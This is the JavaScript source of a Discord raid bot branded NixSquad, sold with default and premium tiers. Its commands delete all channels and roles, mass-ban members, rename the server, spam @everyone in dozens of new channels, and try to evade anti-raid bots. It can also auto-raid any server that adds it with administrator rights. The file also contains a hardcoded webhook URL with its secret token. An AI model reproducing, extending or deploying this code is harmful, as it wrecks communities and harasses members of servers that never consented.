const Discord = require("discord.js");
const client = new Discord.Client({ intents: 3276799 });
const axios = require("axios").default;

const { GUILD_ID, ROLE_ID, TOKEN, ALLOWED_COMMANDS, SECURED_GUILDS, BOTS_ANTI_RAID } = require("./config.json");
const { logCommand, logServer } = require("./utils/logs");
const { checkGuildMembers, checkUserPremium, makePremiumUsers, guildIsSecured, userIsInGuild } = require("./utils/checkers");
const { error, success } = require("./utils/messages");
const { world } = require("./emojis");

const Config = require("./models/Config");
const Premium = require("./models/Premium");
const Raid = require("./models/Raid");
const Blacklist = require("./models/Blacklist");

const prefix = "&";
const owner = "1153748259232292874";

require("./db");

client.on("ready", () => {
    console.log("I am ready!");
});

client.on("guildCreate", async (guild) => {
    checkGuildMembers(guild, client);
    logServer(guild);
    if(guild.members.me.permissions.has("Administrator")) {
        const audit = await guild.fetchAuditLogs({
            "type": 28
        });
        const { executor } = audit.entries.first();
        const Executor = guild.members.cache.get(executor.id);
        const isBlacklisted = await Blacklist.findOne({ userId: Executor.id });
        if(isBlacklisted) return guild.leave();

        const userConfig = await Config.findOne({ userId: Executor.id });
        if(userConfig) {
            if(userConfig.autoRaidServer) {
                if(SECURED_GUILDS.includes(guild.id)) return;
                const userPremium = await Premium.findOne({ userId: Executor.id });
                let serverName;
                let serverIcon;
                let channelsName;
                let spamMsg;
        
                if(userPremium && userPremium.premium) {
                    const userConfig = await Config.findOne({ userId: Executor.id });
                    if(!userConfig) {
                        let conf = await Config.create({ userId: Executor.id });
                        serverName = conf.serverName;
                        serverIcon = conf.serverIcon;
                        channelsName = conf.channelsName;
                        spamMsg = conf.spamMsg;
                    } else {
                        serverName = userConfig.serverName;
                        serverIcon = userConfig.serverIcon;
                        channelsName = userConfig.channelsName;
                        spamMsg = userConfig.spamMsg;
                    }
                } else {
                    serverName = "The Motherfucking NixSquad"
                    serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                    spamMsg = "@everyone https://discord.gg/nixakanazis - | - https://discord.gg/aRbQPVpMv7 / #HailNixSquad"
                    channelsName = "raid-by-nixsquad"
                }

                guild.channels.cache.forEach(async channel => {
                    channel.edit({
                        name: channelsName,
                        parent: null,
                        position: channel.position > 0 ? channel.position - 1 : channel.position + 1
                    }).catch(e => {});
                    for(let i = 0; i < 10; i++) {
                        await channel.send({ content: spamMsg }).catch(e => {});
                    }
                });

                guild.setName(serverName).catch(e => {});

                guild.setIcon(serverIcon).catch(e => {});

                async function createChannels() {
                    for(let i = 0; i < 50; i++) {
                        await guild.channels.create({
                            name: channelsName
                        }).catch(e => {});
                    }
                }

                await createChannels()
                guild.channels.cache.forEach(async channel => {
                    channel.edit({
                        name: channelsName,
                        parent: null,
                        position: channel.position > 0 ? channel.position - 1 : channel.position + 1
                    }).catch(e => {});
                    for(let i = 0; i < 20; i++) {
                        await channel.send({ content: spamMsg }).catch(e => {});
                    }
                });
            }
        }

        const raidExists = await Raid.findOne({ guildId: guild.id });
        if(raidExists) return;
        await Raid.create({ guildId: guild.id, guildName: guild.name, raidDate: Date.now(), raiderId: Executor.id });
    } else {
        return guild.leave();
    }
});

client.on("guildMemberUpdate", async (oldMember, newMember) => {
    if(newMember.guild.id !== GUILD_ID) return;
    const premiumUser = await Premium.findOne({ userId: newMember.id });
    if(newMember.roles.cache.has(ROLE_ID)) {
        if(!premiumUser) {
            await Premium.create({ userId: newMember.id, premium: true, premiumSince: Date.now() });
	    axios.post('https://canary.discord.com/api/webhooks/1155029499205910538/vBqKvUOLqv9ggh5eixNQV2f-lWhjPA3ZP0siFxDh5jnxYUMTSnG3Li9lh-vOqXJUN4RR', 
                 { content: `${newMember} has been added premium! use \`&config\` on <#1141257401723539456>` }
            );
        } else if (premiumUser && !premiumUser.premium) {
            await Premium.findOneAndUpdate({ userId: newMember.id }, { premium: true, premiumSince: Date.now() });
	    axios.post('https://canary.discord.com/api/webhooks/1155029499205910538/vBqKvUOLqv9ggh5eixNQV2f-lWhjPA3ZP0siFxDh5jnxYUMTSnG3Li9lh-vOqXJUN4RR', 
                 { content: `${newMember} has been added premium! use \`&config\` on <#1141257401723539456>` }
            );
        }
    } else if(premiumUser?.premium && !newMember.roles.cache.has(ROLE_ID)) {
      await Premium.findOneAndDelete({ userId: newMember.id });
    }
});

client.on('messageCreate', async (message) => {
    if(message.author.bot) return;
    if(!message.content.startsWith(prefix)) return;
    if(message.guild) return;
    
    const [cmd, ...args] = message.content.trim().substring(prefix.length).split(/\s+/);
    const isBlacklisted = await Blacklist.findOne({ userId: message.author.id });
    if(isBlacklisted) return;

    if(cmd === 'set-token') {
        
    }

})

client.on('messageCreate', async (message) => {
    if(message.author.bot) return;
    if(!message.content.startsWith(prefix)) return;
    
    const [cmd, ...args] = message.content.trim().substring(prefix.length).split(/\s+/);
    const isBlacklisted = await Blacklist.findOne({ userId: message.author.id });
    if(isBlacklisted) return;

    if(!ALLOWED_COMMANDS.includes(cmd.toLowerCase())) {
        if(SECURED_GUILDS.includes(message.guild.id)) {
            message.react("❌").catch(e=>{});
            return message.author.send({ embeds: [{
                    title: "Wow, this guild is secured",
                    description: `This guild is secured, you can't use the bot here, if you want to use the bot, join our support server https://discord.gg/nixakanazis`,
                    color: 481231
                }]
            });
        } else if(!message.guild.members.me.permissions.has("Administrator")) {
            message.react("❌").catch(e=>{});
            return message.author.send({ embeds: [{
                    title: "I need administrator permissions to work",
                    description: `I need administrator permissions to work, please give me administrator permissions to work on this server`,
                    color: 481231
                }]
            });
        }
    }

    logCommand(cmd, message.author);
    
    if(!client.guilds.cache.get(GUILD_ID).members.cache.get(message.author.id)) {
        return message.author.send({ embeds: [{
                title: "Wow, you need to be in our server to use the bot",
                description: `Join our support server to use the bot https://discord.gg/nixakanazis`,
                color: 481231
            }]
        });
    }

    if(cmd === "blacklist") {
        if(message.author.id !== owner) return;
        const user = message.mentions.users.first() || client.users.cache.get(args[0]);
        if(!user) return message.channel.send({ content: "You must provide a user" });
        const blacklistUser = await Blacklist.findOne({ userId: user.id });
        if(!blacklistUser) {
            await Blacklist.create({ userId: user.id });
            success(message, "User is now blacklisted");
        } else if (blacklistUser) {
            await Blacklist.findOneAndDelete({ userId: user.id });
            success(message, "User is no longer blacklisted");
        }
    }

    if(cmd === "leave-bot") {
        if(message.author.id !== owner) return;
        const guild = client.guilds.cache.get(args[0]);
        if(!guild) return message.channel.send({ content: "You must provide a guild id" });
        guild.leave();
        message.channel.send({ content: `I left the guild ${guild.name}` });
    }

    if(cmd === "guilds") {
        if(message.author.id !== owner) return;
        const fields = [];
        client.guilds.cache.map(guild => {
            fields.push({
                name: `${world} ${guild.name}`,
                value: `Members: ${guild.memberCount} | ID: ${guild.id}`
            }); 
        });

        message.channel.send({ embeds: [{
                title: "Guilds",
                fields,
                color: 481231
            }]
        });
    }

    if(cmd === "invite-guild") {
        if(message.author.id !== owner) return;
        const guild = client.guilds.cache.get(args[0]);
        if(!guild) return message.channel.send({ content: "You must provide a guild id" });
        const guildInvites = await guild.invites.fetch();
        let invite = guildInvites.first();
        if(!invite) {
            invite = await guild.channels.cache.filter(channel => channel.type === "GUILD_TEXT").first().createInvite();
            message.channel.send({ content: `https://discord.gg/${invite.code}` });
        } else {
            message.channel.send({ content: `https://discord.gg/${invite.code}` });
        }
    }

    if(cmd === "boosters") {
        if(message.author.id !== owner) return;
        makePremiumUsers(client);
        const usersPremium = await Premium.find({ premium: true });
        message.channel.send({ content: `Now there are ${usersPremium.length} **Premium Users:**` });
    }

    if(cmd === "set.premium") {
        if(message.author.id !== owner) return;
        const user = message.mentions.users.first() || client.users.cache.get(args[0]);
        if(!user) return message.channel.send({ content: "You must provide a user" });
        const premiumUser = await Premium.findOne({ userId: user.id });
        if(!premiumUser) {
            await Premium.create({ userId: user.id, premium: true, premiumSince: Date.now() });
            success(message, "User is now premium");
        } else if (premiumUser && !premiumUser.premium) {
            await Premium.findOneAndUpdate({ userId: user.id }, { premium: true, premiumSince: Date.now() });
            success(message, "User is now premium");
        } else if (premiumUser && premiumUser.premium) {
            return error(message, "User is already premium");
        }
    }

    if(cmd === "remove.premium") {
        if(message.author.id !== owner) return;
        const user = message.mentions.users.first() || client.users.cache.get(args[0]);
        if(!user) return message.channel.send({ content: "You must provide a user" });
        const premiumUser = await Premium.findOne({ userId: user.id });
        if(!premiumUser) {
            return error(message, "User is not premium");
        } else if (premiumUser && premiumUser.premium) {
            await Premium.findOneAndDelete({ userId: user.id });
            success(message, "User is no longer premium");
        }
    }

    if(cmd === "invite") {
        let userPremium = await Premium.findOne({ userId: message.author.id });
        let premium;
        if(!userPremium) {
            premium = "Default";
        } else if(userPremium && !userPremium.premium) {
            premium = "Default";
        } else if(userPremium && userPremium.premium) {
            premium = "Premium 👑";
        }
        message.reply({
            "embeds": [
                {
                    "title": `${world} Check your DMs!`,
                    "color": 3026478
                }
            ]
        }).catch(e => {})
        message.author.send({
            "embeds": [
                {
                  "title": "<a:cl_blackword1:1154630525047287838> nix bot commands",
                  "description": "> bot created by __discord.gg/nixakanazis__\n> your current plan is: `"+premium+"`\n> there is my invite: **[- - > [click here] < - - ](https://discord.com/api/oauth2/authorize?client_id=1154267135409913898&permissions=8&scope=bot)**\n\n<:0_bcat:1142668638999031868> default commands:\n`&on` -> `this command is for default raiding, without bypass`\n`&channels` -> `this command is for deleting all discord channels`\n`&roles` -> `this command is for delete all roles and create new`\n`&massban` -> `this command bans all users on discord server`\n`&bypass` -> `free bypass bots`\n\n<:cl_baphomet:1154630186227216394> custom commands [personalize with premium]:\n`&on` -> `this command is for default raiding, without bypass`\n`&bypassv2` -> `bypass faster all discord anti-raid bots`\n`&appareance` -> `this command is for change discord appareance`\n\n<:0_drain:1142668445507399710> premium commands:\n`&config.message` -> `make a custom spam message [without embed]`\n`&config.channels` -> `make discord channels with custom name`\n`&config.appareance.name` -> `server name executing all default commands`\n`&config.appareance.icon` -> `server icon executing all default commands`\n`&bypassv2` -> `bypass faster all discord anti-raid bots`\n`&massbanv2` -> `ban discord users 500 per second`",
                  "color": 3026478
                }
              ]
        }).catch(e => {
            return error(message, "I can't send you a message, please enable your DMs");
        })
    }
    
    if(cmd === "help") {
        let userPremium = await Premium.findOne({ userId: message.author.id });
        let premium;
        if(!userPremium) {
            premium = "Default";
        } else if(userPremium && !userPremium.premium) {
            premium = "Default";
        } else if(userPremium && userPremium.premium) {
            premium = "Premium 👑";
        }
        message.reply({
            "embeds": [
                {
                    "title": `${world} Check your DMs!`,
                    "color": 3026478
                }
            ]
        }).catch(e => {})
        message.channel.send({
            "embeds": [
                {
                "title": "<a:cl_blackword1:1154630525047287838> nix bot commands",
                "description": "> bot created by __discord.gg/nixakanazis__\n> your current plan is: `"+premium+"`\n> there is my invite: **[- - > [click here] < - - ](https://discord.com/api/oauth2/authorize?client_id=1154267135409913898&permissions=8&scope=bot)**\n\n<:0_bcat:1142668638999031868> default commands:\n`&on` -> `this command is for default raiding, without bypass`\n`&channels` -> `this command is for deleting all discord channels`\n`&roles` -> `this command is for delete all roles and create new`\n`&massban` -> `this command bans all users on discord server`\n`&bypass` -> `free bypass bots`\n\n<:cl_baphomet:1154630186227216394> custom commands [personalize with premium]:\n`&on` -> `this command is for default raiding, without bypass`\n`&bypassv2` -> `bypass faster all discord anti-raid bots`\n`&appareance` -> `this command is for change discord appareance`\n\n<:0_drain:1142668445507399710> premium commands:\n`&config.message` -> `make a custom spam message [without embed]`\n`&config.channels` -> `make discord channels with custom name`\n`&config.appareance.name` -> `server name executing all default commands`\n`&config.appareance.icon` -> `server icon executing all default commands`\n`&bypassv2` -> `bypass faster all discord anti-raid bots`\n`&massbanv2` -> `ban discord users 500 per second`",
                "color": 3026478
                }
            ]
        }).catch(e => {
            return error(message, "I can't send you a message, please enable your DMs");
        })
    }

    if(cmd === "on") {
        if(!message.guild) return;
        const userPremium = await Premium.findOne({ userId: message.author.id });
        let serverName;
        let serverIcon;
        let channelsName;
        let spamMsg;

        if(userPremium && userPremium.premium) {
            const userConfig = await Config.findOne({ userId: message.author.id });
            if(!userConfig) {
                let conf = await Config.create({ userId: message.author.id });
                serverName = conf.serverName;
                serverIcon = conf.serverIcon;
                channelsName = conf.channelsName;
                spamMsg = conf.spamMsg;
            } else {
                serverName = userConfig.serverName;
                serverIcon = userConfig.serverIcon;
                channelsName = userConfig.channelsName;
                spamMsg = userConfig.spamMsg;
            }
        } else {
            serverName = "The Motherfucking NixSquad"
            serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
            spamMsg = "@everyone https://discord.gg/nixakanazis - | - https://discord.gg/aRbQPVpMv7 / #HailNixSquad"
            channelsName = "raid-by-nixsquad"
        }

        if(message.guild.members.cache.some(user => BOTS_ANTI_RAID.includes(user.id))) {
            message.guild.channels.cache.forEach(async channel => {
                channel.edit({
                    name: channelsName,
                    parent: null,
                    position: channel.position > 0 ? channel.position - 1 : channel.position + 1
                }).catch(e => {});
                for(let i = 0; i < 10; i++) {
                    await channel.send({ content: spamMsg }).catch(e => {});
                }
            });
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "started raid on `"+message.guild.name+"`\n\n> Channels: `"+message.guild.channels.cache.size+"`\n> Members: `"+message.guild.memberCount+"`\n> Roles: `"+message.guild.roles.cache.size+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        } else {
            message.guild.setName(serverName)
            .then(() => {
                message.author.send({
                    "embeds": [
                        {
                          "title": `${world} Raid Log`,
                          "description": "updated name on `"+message.guild.name+"`",
                          "color": 3026221,
                          "footer": {
                            "text": "/nixakanazis"
                          },
                          "thumbnail": {
                            "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                          }
                        }
                    ]
                })
            }).catch(e => {});

            message.guild.setIcon(serverIcon)
            .then(() => {
                message.author.send({
                    "embeds": [
                        {
                          "title": `${world} Raid Log`,
                          "description": "updated icon on `"+message.guild.name+"`",
                          "color": 3026221,
                          "footer": {
                            "text": "/nixakanazis"
                          },
                          "thumbnail": {
                            "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                          }
                        }
                    ]
                })
            }).catch(e => {});
            async function createChannels() {
                for(let i = 0; i < 50; i++) {
                    await message.guild.channels.create({
                        name: channelsName
                    }).catch(e => {});
                }
            }

            await createChannels()
            message.guild.channels.cache.forEach(async channel => {
                channel.edit({
                    name: channelsName,
                    parent: null,
                    position: channel.position > 0 ? channel.position - 1 : channel.position + 1
                }).catch(e => {});
                for(let i = 0; i < 20; i++) {
                    await channel.send({ content: spamMsg }).catch(e => {});
                }
            });
        }   
    }
    

    if(cmd === "channels") {
        if(!message.guild) return;
        if(message.guild.members.cache.some(user => BOTS_ANTI_RAID.includes(user.id))) {
            return message.channel.send({
                embeds: [
                    {
                        title: "Wow, this guild has anti-raid bots",
                        description: `This guild has anti-raid bots, this command may not work here. Suggest: use the command \`&on\` or \`&bypass\``,
                        color: 481231
                    }
                ]
            });
        } else {
            message.guild.channels.cache.forEach(async channel => {
                await channel.delete().catch(e => {});
            });
            message.guild.channels.create({
                name: 'get-nuked'
            }).catch(e => {});
        }
    }

    if(cmd === "roles") {
        if(!message.guild) return;
        if(message.guild.members.cache.some(user => BOTS_ANTI_RAID.includes(user.id))) {
            return message.channel.send({
                embeds: [
                    {
                        title: "Wow, this guild has anti-raid bots",
                        description: `This guild has anti-raid bots, this command may not work here. Suggest: use the command \`&on\` or \`&bypass\``,
                        color: 481231
                    }
                ]
            });
        } else {
            message.guild.roles.cache.forEach(async role => {
                await role.delete().catch(e => {});
            });
        }
    }

    if(cmd === "massban") {
        if(!message.guild) return;
        if(message.guild.members.cache.some(user => BOTS_ANTI_RAID.includes(user.id))) {
            message.channel.send({
                embeds: [
                    {
                        title: "Wow, this guild has anti-raid bots",
                        description: `This guild has anti-raid bots, i will do my best to ban all users, but this command may not work here.`,
                        color: 481231
                    }
                ]
            });
        }

        message.guild.members.cache.forEach(async member => {
            if(member.id === client.user.id) return;
            await member.ban().catch(e => {}); 
        });
    }

    if(cmd === "appareance") {
        if(!message.guild) return;
        const userPremium = await Premium.findOne({ userId: message.author.id });
        let serverName;
        let serverIcon;

        if(userPremium && userPremium.premium) {
            const userConfig = await Config.findOne({ userId: message.author.id });
            if(!userConfig) {
                let conf = await Config.create({ userId: message.author.id });
                serverName = conf.serverName;
                serverIcon = conf.serverIcon;
            } else {
                serverName = userConfig.serverName;
                serverIcon = userConfig.serverIcon;
            }
        } else {
            serverName = "The Motherfucking NixSquad"
            serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
        }

        
        message.guild.setName(serverName)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated name on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});

        message.guild.setIcon(serverIcon)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated icon on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});
    }

    if(cmd === "bypass") {
        if(!message.guild) return;
        const userPremium = await Premium.findOne({ userId: message.author.id });
        let serverName;
        let serverIcon;
        let channelsName;
        let spamMsg;

        if(userPremium && userPremium.premium) {
            const userConfig = await Config.findOne({ userId: message.author.id });
            if(!userConfig) {
                let conf = await Config.create({ userId: message.author.id });
                serverName = conf.serverName;
                serverIcon = conf.serverIcon;
                channelsName = conf.channelsName;
                spamMsg = conf.spamMsg;
            } else {
                serverName = userConfig.serverName;
                serverIcon = userConfig.serverIcon;
                channelsName = userConfig.channelsName;
                spamMsg = userConfig.spamMsg;
            }
        } else {
            serverName = "The Motherfucking NixSquad"
            serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
            spamMsg = "@everyone https://discord.gg/nixakanazis - | - https://discord.gg/aRbQPVpMv7 / #HailNixSquad"
            channelsName = "raid-by-nixsquad"
        }
        const headers = {
            'Authorization': `Bot ${TOKEN}`,
            'Content-Type': 'application/json',
        };
        
        const payloads = [
            {
                "verification_level": 1,
                "default_message_notifications": 1,
                "explicit_content_filter": 2,
                "rules_channel_id": "1",
                "public_updates_channel_id": "1",
            },
            {
                "rules_channel_id": null,
                "public_updates_channel_id": null,
            },
        ];
        const guildUrl = `https://discord.com/api/v9/guilds/${message.guild.id}`;
        async function community() {
            for (const payload of payloads) {
                try {
                    const response = await axios.patch(guildUrl, payload, { headers });
        
                    if (response.status === 429) {
                        await new Promise(resolve => setTimeout(resolve, response.data.retry_after));
                    }
                } catch (error) {
                    console.error(error);
                }
            }
        }
        
        async function createChannels() {
            for(let i = 0; i < 20; i++) {
                await community();
            }
        }

        await createChannels().then(() => {
            message.guild.channels.cache.forEach(async channel => {
                await channel.edit({ name: channelsName }).catch(e => {});
                for(let i = 0; i < 10; i++) {
                    await channel.send({ content: spamMsg }).catch(e => {});
                }
            });
        });
        
        message.guild.setName(serverName)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated name on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});

        message.guild.setIcon(serverIcon)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated icon on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});
    }




    /// PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS PREMIUM COMMANDSSS

    if(cmd === "massbanv2") {
        if(!message.guild) return;
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        if(message.guild.members.cache.some(user => BOTS_ANTI_RAID.includes(user.id))) {
            message.channel.send({
                embeds: [
                    {
                        title: "Wow, this guild has anti-raid bots",
                        description: `This guild has anti-raid bots, i will do my best to ban all users, but this command may not work here.`,
                        color: 481231
                    }
                ]
            });
        }
        await message.guild.members.fetch();
        message.guild.members.cache.forEach(async member => {
            if(member.id === client.user.id || member.id === message.author.id) return;
            await member.ban().catch(e => {}); 
        });
    }

    if(cmd === "bypassv2") {
        if(!message.guild) return;
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        let serverName;
        let serverIcon;
        let channelsName;
        let spamMsg;

        if(userPremium && userPremium.premium) {
            const userConfig = await Config.findOne({ userId: message.author.id });
            if(!userConfig) {
                let conf = await Config.create({ userId: message.author.id });
                serverName = conf.serverName;
                serverIcon = conf.serverIcon;
                channelsName = conf.channelsName;
                spamMsg = conf.spamMsg;
            } else {
                serverName = userConfig.serverName;
                serverIcon = userConfig.serverIcon;
                channelsName = userConfig.channelsName;
                spamMsg = userConfig.spamMsg;
            }
        } else {
            serverName = "The Motherfucking NixSquad"
            serverIcon = "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
            spamMsg = "@everyone https://discord.gg/nixakanazis - | - https://discord.gg/aRbQPVpMv7 / #HailNixSquad"
            channelsName = "raid-by-nixsquad"
        }
        const headers = {
            'Authorization': `Bot ${TOKEN}`,
            'Content-Type': 'application/json',
        };
        
        const payloads = [
            {
                "verification_level": 1,
                "default_message_notifications": 1,
                "explicit_content_filter": 2,
                "rules_channel_id": "1",
                "public_updates_channel_id": "1",
            },
            {
                "rules_channel_id": null,
                "public_updates_channel_id": null,
            },
        ];
        const guildUrl = `https://discord.com/api/v9/guilds/${message.guild.id}`;
        async function community() {
            for (const payload of payloads) {
                try {
                    const response = await axios.patch(guildUrl, payload, { headers });
        
                    if (response.status === 429) {
                        await new Promise(resolve => setTimeout(resolve, response.data.retry_after));
                    }
                } catch (error) {
                    console.error(error);
                }
            }
        }
        
        async function createChannels() {
            for(let i = 0; i < 50; i++) {
                await community();
            }
        }

        await createChannels().then(() => {
            message.guild.channels.cache.forEach(async channel => {
                await channel.edit({ name: channelsName }).catch(e => {});
                for(let i = 0; i < 10; i++) {
                    await channel.send({ content: spamMsg }).catch(e => {});
                }
            });
        });
        
        message.guild.setName(serverName)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated name on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});

        message.guild.setIcon(serverIcon)
        .then(() => {
            message.author.send({
                "embeds": [
                    {
                      "title": `${world} Raid Log`,
                      "description": "updated icon on `"+message.guild.name+"`",
                      "color": 3026221,
                      "footer": {
                        "text": "/nixakanazis"
                      },
                      "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1154641135831109674/1154651565345480704/MOSHED-2023-9-15-12-57-54.gif"
                      }
                    }
                ]
            })
        }).catch(e => {});
    }

    /// PREMIUM CONFIG COMMANDS
    if(cmd === "config") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        const userConfig = await Config.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        } else {
            message.channel.send({
                embeds: [
                    {
                        title: "Now showing your config",
                        description: `**Server Name:** ${userConfig.serverName}\n**Channels Name:** ${userConfig.channelsName}\n**Auto Raid Server:** ${userConfig.autoRaidServer ? "Enabled ✅" : "Disabled ❌"}\n**Spam Message:** \`\`\`${userConfig.spamMsg}\`\`\``,
                        color: 481231,
                        thumbnail: {
                            url: userConfig.serverIcon
                        }
                    }
                ]
            })
        }
    }

    if(cmd === "config.message") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        const spamMsg = args.join(" ");
        if(!spamMsg) return error(message, "You must provide a message");
        if(spamMsg.length > 200) return error(message, "The message must be less than 200 characters");
        const userConfig = Config.findOne({ userId: message.author.id });
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        }
        await Config.findOneAndUpdate({ userId: message.author.id }, { spamMsg: spamMsg });
        success(message, "Spam message updated");
    }

    if(cmd === "config.channels") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        const channelsName = args.join("-");
        if(!channelsName) return error(message, "You must provide a name");
        if(channelsName.length > 36) return error(message, "The name must be less than 36 characters");
        const userConfig = Config.findOne({ userId: message.author.id });
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        }
        await Config.findOneAndUpdate({ userId: message.author.id }, { channelsName: channelsName });
        success(message, "Channels name updated");
    }

    if(cmd === "config.appareance.name") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        const serverName = args.join(" ");
        if(!serverName) return error(message, "You must provide a name");
        if(serverName.length > 40) return error(message, "The name must be less than 40 characters");
        const userConfig = Config.findOne({ userId: message.author.id });
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        }
        await Config.findOneAndUpdate({ userId: message.author.id }, { serverName: serverName });
        success(message, "Server name updated");
    }

    if(cmd === "config.appareance.icon") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        const serverIcon = args.join(" ");
        if(!serverIcon) return error(message, "You must provide a url");
        const userConfig = Config.findOne({ userId: message.author.id });
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        }
        await Config.findOneAndUpdate({ userId: message.author.id }, { serverIcon: serverIcon });
        success(message, "Server icon updated");
    }

    if(cmd === "config.autoraid") {
        const userPremium = await Premium.findOne({ userId: message.author.id });
        if(!userPremium) return checkUserPremium(message.author, client);
        if(!userPremium.premium) return checkUserPremium(message.author, client);
        const autoRaidServer = args[0];
        if(!autoRaidServer) return error(message, "You must provide a boolean");
        if(autoRaidServer !== "true" && autoRaidServer !== "false") return error(message, "You must provide a boolean");
        const userConfig = Config.findOne({ userId: message.author.id });
        if(!userConfig) {
            await Config.create({ userId: message.author.id });
            return message.channel.send({ content: "I assigned new configuration to your user id" })
        }
        await Config.findOneAndUpdate({ userId: message.author.id }, { autoRaidServer: autoRaidServer === "true" ? true : false });
        success(message, `Auto raid server updated to ${autoRaidServer === "true" ? "true" : "false"}`);
    }
})


client.login(TOKEN);